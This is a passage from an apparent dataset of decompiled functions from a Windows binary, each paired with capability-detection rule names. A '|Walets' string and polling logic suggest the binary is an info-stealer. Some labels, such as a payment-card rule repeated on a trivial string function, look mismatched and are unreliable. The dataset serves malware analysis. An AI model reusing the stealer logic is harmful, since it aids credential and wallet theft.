var_120h_2, var_154h, var_150h_3, in_stack_fffffed8, 0, 0xf, var_130h_2, \n                         in_stack_fffffee8, in_stack_fffffeec, var_150h, var_130h, var_11ch_2, var_114h_4, \n                         in_stack_ffffff00, var_120h, var_11ch, var_114h_6, var_114h_2, in_stack_ffffff14, var_114h_3, \n                         in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24, var_114h_5, in_stack_ffffff2c, \n                         in_stack_ffffff30, in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                         in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, in_stack_ffffff54, \n                         in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, in_stack_ffffff64, in_stack_ffffff68, \n                         in_stack_ffffff6c, in_stack_ffffff70);\n        }\n        in_stack_fffffe7c = *0x4552cc;\n        if (*0x4552e0 < 0x10) {\n            in_stack_fffffe7c = 0x4552cc;\n        }\n        in_stack_fffffe80 = \"ERROR\";\n        iVar4 = (**0x457550)();\n        if (iVar4 != 0) {\n            fcn.0040e750();\n            var_4h_12 = 0x10;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e810();\n            var_4h_12 = 0x11;\ncode_r0x004143f2:\n            fcn.00408ff0();\n            goto code_r0x00414415;\n        }\n        pcVar14 = L\"|Walets\";\n        puVar15 = &stack0xfffffe5c;\n        uVar9 = 0x413e4a;\n        fcn.0040e780();\n        var_4h_12 = 10;\n        fcn.0040e7b0();\n        var_4h_12._0_1_ = 0xb;\n        iVar4 = fcn.0040e7b0();\n        uVar6 = *(iVar4 + 0x10) + 1;\n        var_4h_12 = CONCAT31(var_4h_12._1_3_, 0xd);\n        fcn.00412220(uVar6, in_stack_fffffe40, in_stack_fffffe44, iVar3, noname_0, in_stack_fffffe50, in_stack_fffffe54\n                     , uVar9, in_stack_fffffe5c, in_stack_fffffe60, in_stack_fffffe64, uVar12, in_stack_fffffe6c, \n                     in_stack_fffffe70, in_stack_fffffe74, pcVar14, in_stack_fffffe7c, in_stack_fffffe80, noname_14, \n                     noname_27, noname_16, 0x44ed28, noname_18, unaff_EDI, unaff_ESI, unaff_EBX, puVar11, puVar15, \n                     &stack0xfffffe40, var_158h_2, var_130h_3, var_158h_3, var_130h_4, var_154h_2, in_stack_fffffec4, \n                     var_11ch_3, var_120h_2, var_154h, var_150h_3, in_stack_fffffed8, 0, 0xf, var_130h_2, \n                     in_stack_fffffee8, in_stack_fffffeec, var_150h, var_130h, var_11ch_2, var_114h_4, in_stack_ffffff00\n                     , var_120h, var_11ch, var_114h_6, var_114h_2, in_stack_ffffff14, var_114h_3, in_stack_ffffff1c, \n                     in_stack_ffffff20, in_stack_ffffff24, var_114h_5);\n        var_4h_12 = 0xffffffff;\n        var_150h_2 = 0xf;\n        var_150h_4 = 0;\n        var_120h_2 = uVar2 & 0xffffff00;\n        uVar13 = *0x4552cc;\n        if (*0x4552e0 < 0x10) {\n            uVar13 = 0x4552cc;\n        }\n        pcVar5 = \"ERROR\";\n        uVar10 = 0x413ed9;\n        iVar4 = (**0x457550)();\n        if (iVar4 != 0) {\n            puVar11 = &stack0xfffffe58;\n            noname_18_00 = 0x413ef1;\n            fcn.0040e810();\n            var_4h_12 = 0xe;\n            pcVar7 = &stack0xfffffee8;\n            in_stack_fffffe50 = 0xf;\n            noname_0 = 0;\n            uVar6 = uVar6 & 0xffffff00;\n            do {\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar4 = pcVar7 - &stack0xfffffee9;\n            in_stack_fffffe34 = &stack0xfffffee8;\n            in_stack_fffffe30 = 0x413f36;\n            fcn.004090e0(in_stack_fffffe34, iVar4);\n            puVar15 = &stack0xfffffe18;\n            var_4h_12 = CONCAT31(var_4h_12._1_3_, 0xf);\n            noname_2 = 0xffffffff;\n            noname_1 = 0;\n            in_stack_fffffe2c = 0xf;\n            in_stack_fffffe28 = 0;\n            noname_0_00 = 0x4552cc;\n            in_stack_fffffe18 = in_stack_fffffe18 & 0xffffff00;\n            fcn.004092e0(0x4552cc, 0, 0xffffffff);\n            var_4h_12 = 0xffffffff;\n            fcn.00412410(noname_0_00, noname_1, noname_2, in_stack_fffffe18, in_stack_fffffe1c, in_stack_fffffe20, \n                         in_stack_fffffe24, in_stack_fffffe28, in_stack_fffffe2c, in_stack_fffffe30, in_stack_fffffe34, \n                         iVar4, uVar6, in_stack_fffffe40, in_stack_fffffe44, iVar3, noname_0, in_stack_fffffe50, \n                         noname_18_00, uVar9, in_stack_fffffe5c, in_stack_fffffe60, in_stack_fffffe64, uVar12, \n                         in_stack_fffffe6c, uVar10, uVar13, pcVar5, in_stack_fffffe7c, in_stack_fffffe80, noname_14, \n                         noname_27, noname_16, 0x44ed28, noname_18, unaff_EDI, unaff_ESI, unaff_EBX, puVar15, puVar11, \n                         &stack0xfffffe3c, var_158h_2, var_130h_3, var_158h_3, var_130h_4, var_154h_2, in_stack_fffffec4\n                         , var_11ch_3, var_120h_2, var_154h, var_150h_3, in_stack_fffffed8, 0, 0xf, var_130h_2, \n                         in_stack_fffffee8, in_stack_fffffeec, var_150h, var_130h, var_11ch_2, var_114h_4, \n                         in_stack_ffffff00, var_120h, var_11ch, var_114h_6, var_114h_2, in_stack_ffffff14, var_114h_3, \n                         in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24, var_114h_5, in_stack_ffffff2c, \n                         in_stack_ffffff30, in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                         in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, in_stack_ffffff54, \n                         in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60);\n        }\n        uVar12 = *0x4552cc;\n        if (*0x4552e0 < 0x10) {\n            uVar12 = 0x4552cc;\n        }\n        pcVar7 = \"ERROR\";\n        uVar9 = 0x413f8d;\n        iVar4 = (**0x457550)();\n        if (iVar4 != 0) {\n            fcn.0040e750();\n            var_4h_12 = 0x1a;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e810();\n            var_4h_12 = 0x1b;\ncode_r0x00414283:\n            fcn.00408ff0();\n            goto code_r0x00414415;\n        }\n        in_stack_fffffea8 = &stack0xfffffe60;\n        in_stack_fffffe5c = 0x413fa5;\n        fcn.0040e810();\n        var_4h_12 = 0x12;\n        pcVar8 = &stack0xfffffee8;\n        in_stack_fffffe58 = 0xf;\n        in_stack_fffffe54 = 0;\n        in_stack_fffffe44 = in_stack_fffffe44 & 0xffffff00;\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar1 != '\\0');\n        in_stack_fffffe40 = pcVar8 - &stack0xfffffee9;\n        puVar11 = &stack0xfffffee8;\n        uVar10 = 0x413fe6;\n        fcn.004090e0(puVar11, in_stack_fffffe40);\n        puVar15 = &stack0xfffffe20;\n        var_4h_12 = CONCAT31(var_4h_12._1_3_, 0x13);\n        fcn.0040e7e0();\n        var_4h_12 = 0xffffffff;\n        in_stack_fffffe1c = 0x414002;\n        fcn.00412410(in_stack_fffffe20, in_stack_fffffe24, in_stack_fffffe28, in_stack_fffffe2c, in_stack_fffffe30, \n                     in_stack_fffffe34, uVar10, puVar11, in_stack_fffffe40, in_stack_fffffe44, iVar3, noname_0, \n                     in_stack_fffffe50, in_stack_fffffe54, in_stack_fffffe58, in_stack_fffffe5c, in_stack_fffffe60, \n                     in_stack_fffffe64, uVar9, uVar12, pcVar7, uVar13, pcVar5, in_stack_fffffe7c, in_stack_fffffe80, \n                     noname_14, noname_27, noname_16, 0x44ed28, noname_18, unaff_EDI, unaff_ESI, unaff_EBX, puVar15, \n                     in_stack_fffffea8, &stack0xfffffe44, var_158h_2, var_130h_3, var_158h_3, var_130h_4, var_154h_2, \n                     in_stack_fffffec4, var_11ch_3, var_120h_2, var_154h, var_150h_3, in_stack_fffffed8, 0, 0xf, \n                     var_130h_2, in_stack_fffffee8, in_stack_fffffeec, var_150h, var_130h, var_11ch_2, var_114h_4, \n                     in_stack_ffffff00, var_120h, var_11ch, var_114h_6, var_114h_2, in_stack_ffffff14, var_114h_3, \n                     in_stack_ffffff1c, in_stack_ffffff20, in_stack_ffffff24, var_114h_5, in_stack_ffffff2c, \n                     in_stack_ffffff30, in_stack_ffffff34, in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, \n                     in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, in_stack_ffffff50, in_stack_ffffff54, \n                     in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, in_stack_ffffff64, in_stack_ffffff68, \n                     in_stack_ffffff6c, in_stack_ffffff70, in_stack_ffffff74);\n        in_stack_fffffe6c = *0x4552cc;\n        if (*0x4552e0 < 0x10) {\n            in_stack_fffffe6c = 0x4552cc;\n        }\n        iVar3 = (**0x457550)();\n        if (iVar3 != 0) {\n            fcn.0040e750();\n            var_4h_12 = 0x24;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e810();\n            var_4h_12 = 0x25;\ncode_r0x00414210:\n            fcn.00408ff0();\n            goto code_r0x00414415;\n        }\n        iVar3 = (**0x457550)();\n        if (iVar3 != 0) {\n            fcn.0040e840();\n            var_4h_12 = 0x2e;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e870();\n            var_4h_12 = 0x2f;\n            goto code_r0x004143f2;\n        }\n        iVar3 = (**0x457550)();\n        if (iVar3 != 0) {\n            fcn.0040e870();\n            var_4h_12 = 0x38;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e870();\n            var_4h_12 = 0x39;\n            goto code_r0x00414283;\n        }\n        iVar3 = (**0x457550)();\n        if (iVar3 != 0) {\n            fcn.0040e870();\n            var_4h_12 = 0x42;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e870();\n            var_4h_12 = 0x43;\n            goto code_r0x00414210;\n        }\n        iVar3 = (**0x457550)();\n        if (iVar3 != 0) {\n            fcn.0040e870();\n            var_4h_12 = 0x4c;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e870();\n            var_4h_12 = 0x4d;\n            goto code_r0x004143f2;\n        }\n        in_stack_fffffe70 = 0x4140e6;\n        iVar3 = (**0x457550)();\n        if (iVar3 != 0) {\n            fcn.0040e870();\n            var_4h_12 = 0x4e;\n            fcn.00408ff0();\n            var_4h_12 = 0xffffffff;\n            fcn.0040e870();\n            var_4h_12 = 0x4f;\n            fcn.00408ff0();\n            if (0xf < in_stack_fffffec4) {\n                fcn.0042d62b();\n            }\ncode_r0x00414415:\n            *in_FS_OFFSET = iStack16;\n            fcn.0042d636(noname_16);\n            return;\n        }\n        in_stack_fffffe78 = 60000;\n        in_stack_fffffe74 = 0x4140f5;\n        (**0x457390)();\n    } while( true );\n}\n",
        "token_count": 7007
    },
    "00414440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004145f8) overlaps instruction at (ram,0x004145f7)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00414440(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    bool bVar2;\n    ulong uVar3;\n    uint uVar4;\n    uint noname_1;\n    uint noname_2;\n    uint32_t in_stack_fffff72c;\n    uint in_stack_fffff730;\n    uint in_stack_fffff734;\n    uint var_856h;\n    uint var_838h;\n    int32_t var_834h;\n    uint var_830h;\n    int32_t var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint32_t var_820h;\n    uint var_810h;\n    uint32_t var_80ch;\n    uint32_t var_7fch;\n    uint var_7ech;\n    uint32_t var_7e8h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x44398c;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_80ch = 0xf;\n    var_810h = 0;\n    var_820h = var_820h & 0xffffff00;\n    var_4h = 0;\n    fcn.00401210();\n    fcn.00427a80();\n    *0x4572e8 = 41000;\n    *0x4572f4 = 0;\n    *0x4572e0 = 0;\n    fcn.00434d30();\n    fcn.004220c0();\n    var_4h._0_1_ = 1;\n    (**0x457520)();\n    var_4h._0_1_ = 0;\n    if (0xf < var_7e8h) {\n        fcn.0042d62b();\n    }\n    fcn.00422c00();\n    var_4h._0_1_ = 2;\n    (**0x457520)();\n    var_4h._0_1_ = 0;\n    if (0xf < var_7e8h) {\n        fcn.0042d62b();\n    }\n    fcn.00422630();\n    var_4h._0_1_ = 3;\n    (**0x457520)();\n    var_4h = var_4h._1_3_ << 8;\n    if (0xf < var_7e8h) {\n        fcn.0042d62b();\n    }\n    var_7e8h = 0xf;\n    var_7ech = 0;\n    var_7fch = var_7fch & 0xffffff00;\n    *0x4572f0 = (**0x457380)();\n    while (bVar2 = *0x4572f0 == 0,  !bVar2) {\n        (**0x4573b8)();\n        (**0x457390)();\n        *0x4572f0 = (**0x457380)();\n    }\n    *0x4572f0 = (**0x457508)();\n    if ((!bVar2) && (bVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00413c70();\n    *0x4572ec = fcn.0042c910();\n    fcn.00434d30();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    noname_2 = 0xffffffff;\n    noname_1 = 0;\n    uVar4 = 0x455304;\n    in_stack_fffff72c = in_stack_fffff72c & 0xffffff00;\n    fcn.004092e0(0x455304, 0, 0xffffffff);\n    uVar3 = fcn.00417e20(uVar4, noname_1, noname_2, in_stack_fffff72c, in_stack_fffff730, in_stack_fffff734);\n    *0x4572dc = fcn.0040e260(uVar3, uVar3 >> 0x20);\n    uVar3 = fcn.00412640(0);\n    fcn.0041f580(uVar3, uVar3 >> 0x20);\n    if (*0x4576e0 != '\\0') {\n        fcn.00413b20();\n    }\n    fcn.00405520();\n    if (*0x4576e4 != 0) {\n        fcn.0040f830();\n    }\n    fcn.00412ad0();\n    if (*0x4576de != '\\0') {\n        fcn.00415ef0();\n    }\n    fcn.004110a0();\n    if (*0x4576e3 != '\\0') {\n        fcn.00424840();\n    }\n    fcn.0042caa0();\n    var_82ch = 0;\n    var_824h = 0;\n    if ((var_834h != 0) && (iVar1 = (**0x45735c)(var_834h, &stack0xfffff72c, 0x40000001, 0),  iVar1 != 0)) {\n        uVar4 = (**0x45757c)(0);\n        var_82ch = (**0x457504)(uVar4);\n        if (var_82ch != 0) {\n            fcn.00434d30(var_82ch, 0);\n            (**0x45735c)(var_834h, &stack0xfffff72c, 0x40000001, var_82ch);\n        }\n    }\n    uVar4 = 0;\n    var_828h = var_824h;\n    (**0x457558)(0, 0, fcn.00412720, &var_82ch);\n    iVar1 = 0;\n    while (*0x4576ec == 0) {\n        if (*0x4576f0 != 0) goto code_r0x004148a3;\n        if (iVar1 == 0x3c) {\n            (**0x457558)(0, 0, fcn.00412720, &var_82ch, 0, 0);\n            iVar1 = 0;\n        }\n        (**0x457390)(1000);\n        iVar1 = iVar1 + 1;\n    }\n    do {\n        (**0x457390)(1000);\n    } while (*0x4576f4 == 0);\ncode_r0x004148a3:\n    *0x4572ec = 0;\n    *0x4572f0 = 0;\n    fcn.00424600();\n    if (0xf < var_80ch) {\n        fcn.0042d62b(var_820h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(uVar4);\n    return;\n}\n",
        "token_count": 1648
    },
    "00414990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414990(void)\n\n{\n    uint *unaff_ESI;\n    \n    if (7 < unaff_ESI[5]) {\n        fcn.0042d62b(*unaff_ESI);\n    }\n    unaff_ESI[5] = 7;\n    unaff_ESI[4] = 0;\n    *unaff_ESI = 0;\n    return;\n}\n",
        "token_count": 88
    },
    "004149c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004149c0(uint *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    \n    if ((arg_10h != 0) || (arg_8h[4] <= in_EAX && in_EAX != arg_8h[4])) {\n        if ((in_EAX < arg_8h[4]) && (uVar5 = arg_8h[4] - in_EAX,  arg_10h <= uVar5)) {\n            iVar6 = uVar5 + (1 - arg_10h);\n            puVar4 = arg_8h;\n            if (0xf < arg_8h[5]) {\n                puVar4 = *arg_8h;\n            }\n            iVar1 = puVar4 + in_EAX;\n            iVar2 = fcn.0042e260(iVar1, *arg_ch, iVar6);\n            while (iVar2 != 0) {\n                iVar3 = fcn.0040e640();\n                if (iVar3 == 0) {\n                    if (0xf < arg_8h[5]) {\n                        arg_8h = *arg_8h;\n                    }\n                    return iVar2 - arg_8h;\n                }\n                iVar6 = iVar6 + -1 + (iVar1 - iVar2);\n                iVar1 = iVar2 + 1;\n                iVar2 = fcn.0042e260(iVar1, *arg_ch, iVar6);\n            }\n        }\n        in_EAX = 0xffffffff;\n    }\n    return in_EAX;\n}\n",
        "token_count": 396
    },
    "00414a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00414a70(uint arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    char **in_EAX;\n    char **ppcVar3;\n    int32_t iVar4;\n    \n    pcVar1 = in_EAX[4];\n    if (pcVar1 != NULL) {\n        ppcVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar3 = *in_EAX;\n        }\n        ppcVar2 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar2 = *in_EAX;\n        }\n        for (; ppcVar2 < pcVar1 + ppcVar3; ppcVar2 = ppcVar2 + 1) {\n            iVar4 = fcn.0042e260(\" \\n\\r\\t\", *ppcVar2, arg_8h);\n            if (iVar4 == 0) {\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                return ppcVar2 - in_EAX;\n            }\n        }\n    }\n    return -1;\n}\n",
        "token_count": 268
    },
    "00414be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00414be0(uint *arg_8h, int32_t arg_ch, char *arg_10h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *pcVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441cf9;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    pcVar3 = arg_10h;\n    do {\n        cVar2 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar2 != '\\0');\n    pcVar1 = arg_8h[4];\n    pcVar3 = pcVar3 + (*(arg_ch + 0x10) - (arg_10h + 1));\n    if (((pcVar1 <= pcVar3) && (arg_8h[5] != pcVar3)) && (cVar2 = fcn.004093d0(pcVar3, 1),  cVar2 != '\\0')) {\n        arg_8h[4] = pcVar1;\n        puVar4 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            puVar4 = *arg_8h;\n        }\n        *(puVar4 + pcVar1) = '\\0';\n    }\n    fcn.00409840(arg_ch, 0);\n    pcVar3 = arg_10h + 1;\n    do {\n        cVar2 = *arg_10h;\n        arg_10h = arg_10h + 1;\n    } while (cVar2 != '\\0');\n    fcn.00414cc0(arg_10h - pcVar3);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 477
    },
    "00414cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414cc0(uint32_t arg_8h)\n\n{\n    int32_t **in_EAX;\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    uint32_t uVar3;\n    ulong uVar4;\n    \n    if (in_EAX != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0xf < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= in_EAX) {\n            ppiVar2 = in_ECX;\n            if (0xf < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (in_EAX < in_ECX[4] + ppiVar2) {\n                if (0xf < piVar1) {\n                    fcn.00409840(in_ECX, in_EAX - *in_ECX);\n                    return;\n                }\n                fcn.00409840(in_ECX, in_EAX - in_ECX);\n                return;\n            }\n        }\n    }\n    piVar1 = in_ECX[4];\n    uVar3 = arg_8h;\n    if (-piVar1 - 1U <= arg_8h) {\n        uVar4 = fcn.0042cb30(\"string too long\");\n        uVar3 = uVar4 >> 0x20;\n        piVar1 = uVar4;\n    }\n    uVar4 = CONCAT44(uVar3, piVar1);\n    if (uVar3 != 0) {\n        piVar1 = piVar1 + uVar3;\n        if (piVar1 == 0xffffffff) {\n            uVar4 = fcn.0042cb30(\"string too long\");\n        }\n        uVar3 = uVar4 >> 0x20;\n        if (in_ECX[5] < piVar1) {\n            fcn.00409570(piVar1, uVar4);\n            uVar3 = arg_8h;\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        ppiVar2 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar2 = *in_ECX;\n        }\n        fcn.0042f700(in_ECX[4] + ppiVar2, in_EAX, uVar3);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 667
    },
    "00415ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415ef0(int32_t param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_53ch_19;\n    uint var_4h_50;\n    uint var_544h_8;\n    uint var_540h_8;\n    uint var_53ch_18;\n    uint var_4h_49;\n    uint var_53ch_17;\n    uint var_548h_7;\n    uint var_53ch_16;\n    uint var_4h_48;\n    uint var_544h_7;\n    uint var_540h_7;\n    uint var_53ch_15;\n    uint var_4h_47;\n    uint var_53ch_14;\n    uint var_548h_6;\n    uint var_4h_46;\n    uint var_544h_6;\n    uint var_540h_6;\n    uint var_53ch_13;\n    uint var_4h_45;\n    uint var_53ch_12;\n    uint var_548h_5;\n    uint var_53ch_11;\n    uint var_4h_44;\n    uint var_544h_5;\n    uint var_540h_5;\n    uint var_53ch_10;\n    uint var_4h_43;\n    uint var_53ch_9;\n    uint var_548h_4;\n    uint var_53ch_8;\n    uint var_4h_42;\n    uint var_544h_4;\n    uint var_540h_4;\n    uint var_53ch_7;\n    uint var_4h_41;\n    uint var_53ch_6;\n    uint var_548h_3;\n    uint var_4h_40;\n    uint var_544h_3;\n    uint var_540h_3;\n    uint var_53ch_5;\n    uint var_4h_39;\n    uint var_53ch_4;\n    uint var_548h_2;\n    uint var_4h_38;\n    uint var_544h_2;\n    uint var_540h_2;\n    uint var_53ch_3;\n    uint var_4h_37;\n    uint var_53ch_2;\n    uint var_4h_36;\n    uint var_544h;\n    uint var_53ch;\n    uint var_4h_35;\n    uint var_4h_34;\n    uint var_4h_33;\n    uint var_4h_32;\n    uint var_4h_31;\n    uint var_4h_30;\n    uint var_4h_29;\n    uint var_4h_28;\n    uint var_4h_27;\n    uint var_4h_26;\n    uint var_4h_25;\n    uint var_4h_24;\n    uint var_4h_23;\n    uint var_4h_22;\n    uint var_4h_21;\n    uint var_4h_20;\n    uint var_4h_19;\n    uint var_4h_18;\n    uint var_4h_17;\n    uint var_4h_16;\n    uint var_4h_15;\n    uint var_4h_14;\n    uint var_4h_13;\n    uint var_4h_12;\n    uint var_4h_11;\n    uint var_4h_10;\n    uint var_4h_9;\n    uint var_4h_8;\n    uint var_4h_7;\n    uint var_4h_6;\n    uint var_4h_5;\n    uint var_4h_4;\n    uint var_4h_3;\n    uint var_4h_2;\n    uint var_4h;\n    uint var_548h;\n    uint var_540h;\n    uint var_10h;\n    uint var_ch;\n    uint *arg_8h;\n    uint var_540h_20;\n    uint var_538h;\n    uint var_53ch_49;\n    uint var_548h_19;\n    uint var_544h_19;\n    uint var_540h_19;\n    uint var_53ch_48;\n    uint var_53ch_47;\n    uint var_548h_18;\n    uint var_544h_18;\n    uint var_540h_18;\n    uint var_53ch_46;\n    uint var_53ch_45;\n    uint var_548h_17;\n    uint var_53ch_44;\n    uint var_544h_17;\n    uint var_540h_17;\n    uint var_53ch_43;\n    uint var_53ch_42;\n    uint var_548h_16;\n    uint var_53ch_41;\n    uint var_544h_16;\n    uint var_540h_16;\n    uint var_53ch_40;\n    uint var_53ch_39;\n    uint var_548h_15;\n    uint var_328h;\n    uint var_53ch_38;\n    uint var_544h_15;\n    uint var_540h_15;\n    uint var_53ch_37;\n    uint var_53ch_36;\n    uint var_548h_14;\n    uint var_53ch_35;\n    uint var_544h_14;\n    uint var_540h_14;\n    uint var_53ch_34;\n    uint var_53ch_33;\n    uint var_548h_13;\n    uint var_53ch_32;\n    uint var_220h;\n    uint var_544h_13;\n    uint var_540h_13;\n    uint var_53ch_31;\n    uint var_53ch_30;\n    uint var_548h_12;\n    uint var_53ch_29;\n    uint var_544h_12;\n    uint var_540h_12;\n    uint var_53ch_28;\n    uint var_53ch_27;\n    uint var_548h_11;\n    uint var_544h_11;\n    uint var_540h_11;\n    uint var_53ch_26;\n    uint var_118h;\n    uint var_53ch_25;\n    uint var_548h_10;\n    uint var_544h_10;\n    uint var_540h_10;\n    uint var_53ch_24;\n    uint var_53ch_23;\n    uint var_548h_9;\n    uint var_53ch_22;\n    uint var_544h_9;\n    uint var_540h_9;\n    uint var_53ch_21;\n    uint var_53ch_20;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_548h_8;\n    \n    var_548h_8 = 0xffffffff;\n    uStack12 = 0x443782;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    *(var_53ch_19 + 0x20) = *0x4572ec;\n    pcVar3 = *0x456d50;\n    *(var_53ch_19 + 0x1c) = 0;\n    pcVar2 = pcVar3;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(pcVar3, pcVar2 - (pcVar3 + 1));\n    var_548h_8 = 0;\n    pcVar3 = *0x456cfc;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456cfc, pcVar3 - (*0x456cfc + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 1);\n    pcVar3 = *0x456f38;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456f38, pcVar3 - (*0x456f38 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(0x44ee14, 3);\n    var_548h_8 = 2;\n    pcVar3 = *0x456e3c;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456e3c, pcVar3 - (*0x456e3c + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 3);\n    pcVar3 = *0x456f04;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while 